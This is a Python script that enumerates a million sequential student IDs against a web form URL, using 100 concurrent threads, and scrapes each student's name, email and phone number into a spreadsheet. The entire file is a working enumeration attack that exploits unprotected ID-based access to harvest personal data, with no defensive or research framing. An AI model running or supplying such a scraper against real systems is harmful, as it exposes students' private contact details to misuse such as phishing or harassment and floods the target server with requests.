import requests
from lxml import html
import openpyxl
from concurrent.futures import ThreadPoolExecutor
import time

#Stores current time to figure out runtime later
start = time.time()

#Creates an excel workbook and initializes columns
wb = openpyxl.Workbook()
sheet = wb.active
sheet['A1'].value = "ID"
sheet['B1'].value = "Name"
sheet['C1'].value = "Email"
sheet['D1'].value = "Phone"

#List to store student information to write to excel sheet in the future
master_list = []

#Creates a range of urls to visit varying by student ID
def create_list():
    url_list = []
    for i in range(0,1000000):
        id = '{0:07}'.format(i)
        url = ''+id
        url_list.append(url)
    return url_list

#Stores range of urls to be used in enumerate_form function
url_list = create_list()

#Enumerates through all the urls in url_list created and writes information found to master list
def enumerate_form(url):
    
    #Seperates ID from url
    id = url.split("StuID=")[1]
    print(f"Trying ID: {id}")
    
    #Loads webpage and stores contents in tree
    page = requests.get(url)
    tree = html.fromstring(page.text)
    
    #Goes to XPATH location for name on the form and stores the information
    name = tree.xpath('//*[@name="tfa_1"]')[0].items()[3][1]
 
    #Goes to XPATH location for email on the form and stores the information
    email = tree.xpath('//*[@name="tfa_2"]')[0].items()[3][1]
    
    #Goes to XPATH location for phone on the form and stores the information
    phone = tree.xpath('//*[@name="tfa_94"]')[0].items()[3][1]
        
    #If a name was found then it appends all the data it found to the master list
    if name:
        master_list.append([id,name,email,phone])
        print(f"Name: {name}")
        print(f"Email: {email}")
        print(f"Phone: {phone}")

#Creates multiple threads so python can make multiple requests to the webpage
processes = []
with ThreadPoolExecutor(max_workers=100) as executor:
    for url in url_list:
        processes.append(executor.submit(enumerate_form, url))

#Counter for iterating through excel cells
counter = 1

#Iterates through all the students in the master list and writes them to excel
for student in master_list:
    counter += 1
    sheet['A'+str(counter)].value = student[0]
    sheet['B'+str(counter)].value = student[1]
    sheet['C'+str(counter)].value = student[2]
    sheet['D'+str(counter)].value = student[3]

#Saves excel workbook
wb.save("StudentInformation.xlsx")

#Calculates run time and prints it out
end = time.time()
print(end - start)
